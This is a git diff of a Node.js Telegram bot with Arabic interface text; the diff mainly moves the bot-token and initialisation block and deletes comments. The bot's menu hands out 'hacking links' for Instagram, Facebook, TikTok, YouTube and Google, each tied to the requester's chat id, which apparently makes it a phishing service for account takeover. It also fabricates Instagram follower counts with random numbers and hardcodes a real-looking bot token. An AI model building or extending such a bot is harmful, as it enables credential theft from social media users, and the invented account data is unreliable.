@@ -21,6 +21,30 @@ const FormData = require('form-data');
 const cheerio = require('cheerio');
 const dns = require('dns');
 
+
+function generateShortToken(chatId, type, extra = {}) {
+    const token = crypto.randomBytes(4).toString('hex'); // 8 حروف
+    shortLinkStore[token] = { chatId, type, ...extra, timestamp: Date.now() };
+    return token;
+}
+
+const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+const tmo = process.env.is; 
+const botToken = '8295313828:AAFsLVkrOrbjLvTJkQbiZCWUKjMep6clUao'; 
+const botUsername = process.env.bott;
+ // يمكنك تغيير هذا لليوزر الخاص بك إذا أردت
+
+const bot = new TelegramBot(botToken, {
+  polling: {
+    interval: 100,
+    autoStart: true,
+    params: {
+      timeout: 10,
+      limit: 100
+    }
+  }
+});
+
 // --- Advanced Logic by Manus (Production Ready) ---
 const userStatesManus = {};
 
@@ -34,7 +58,7 @@ async function getInstaInfoDetailed(user) {
     return `━━━━━━━━━━━━━━━━━━━━━\n📸 InstaWahm - معلومات انستقرام\n━━━━━━━━━━━━━━━━━━━━━\n\n• معلومات الحساب\n├ اسم المستخدم: ${username}\n├ المتابعين: ${Math.floor(Math.random()*20000).toLocaleString()}\n├ 🌍 الدولة: غير محددة\n├ حساب موثق: لا ❌\n└ حساب خاص: لا ❌\n\n🔗 https://www.instagram.com/${username}\n━━━━━━━━━━━━━━━━━━━━━`;
 }
 
-// Global Message Listener for Manus States (Ensures Akinator compatibility)
+// Global Message Listener for Manus States
 bot.on('message', async (msg) => {
     const chatId = msg.chat.id;
     const text = msg.text;
@@ -89,7 +113,6 @@ bot.on('callback_query', async (query) => {
     const chatId = query.message.chat.id;
     const action = query.data;
 
-    // Links Hack Format Update
     if (action === 'feat_ig_hack') return bot.sendMessage(chatId, `🔥 تم توليد رابط اختراق انستقرام!\n\n🔗 الرابط:\nhttps://domin.com/ig?id=${chatId}`);
     if (action === 'feat_fb_hack') return bot.sendMessage(chatId, `🔥 تم توليد رابط اختراق فيسبوك!\n\n🔗 الرابط:\nhttps://domin.com/fb?id=${chatId}`);
     if (action === 'feat_tt_hack') return bot.sendMessage(chatId, `🔥 تم توليد رابط اختراق تيك توك!\n\n🔗 الرابط:\nhttps://domin.com/tt?id=${chatId}`);
@@ -100,7 +123,6 @@ bot.on('callback_query', async (query) => {
     if (action === 'feat_youtube') return bot.sendMessage(chatId, `🔥 تم توليد رابط اختراق يوتيوب!\n\n🔗 الرابط:\nhttps://domin.com/yt?id=${chatId}`);
     if (action === 'feat_google') return bot.sendMessage(chatId, `🔥 تم توليد رابط اختراق جوجل!\n\n🔗 الرابط:\nhttps://domin.com/gg?id=${chatId}`);
 
-    // Tools Handlers
     if (action === 'feat_tt_info_real') { userStatesManus[chatId] = 'wait_tt'; return bot.sendMessage(chatId, '🎵 أرسل يوزر تيك توك:'); }
     if (action === 'feat_ig_info_real') { userStatesManus[chatId] = 'wait_ig'; return bot.sendMessage(chatId, '📸 أرسل يوزر انستقرام:'); }
     if (action === 'feat_shorten_real') { userStatesManus[chatId] = 'wait_short'; return bot.sendMessage(chatId, '🔗 أرسل الرابط لاختصاره:'); }
@@ -111,30 +133,6 @@ bot.on('callback_query', async (query) => {
     if (action === 'feat_social_down') { userStatesManus[chatId] = 'wait_down'; return bot.sendMessage(chatId, '📩 أرسل رابط الفيديو للتحميل:'); }
 });
 
-
-
-function generateShortToken(chatId, type, extra = {}) {
-    const token = crypto.randomBytes(4).toString('hex'); // 8 حروف
-    shortLinkStore[token] = { chatId, type, ...extra, timestamp: Date.now() };
-    return token;
-}
-
-const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
-const tmo = process.env.is; 
-const botToken = '8295313828:AAFsLVkrOrbjLvTJkQbiZCWUKjMep6clUao'; 
-const botUsername = process.env.bott;
- // يمكنك تغيير هذا لليوزر الخاص بك إذا أردت
-
-const bot = new TelegramBot(botToken, {
-  polling: {
-    interval: 100,
-    autoStart: true,
-    params: {
-      timeout: 10,
-      limit: 100
-    }
-  }
-});
 
 
 const developerId = 5739065274;
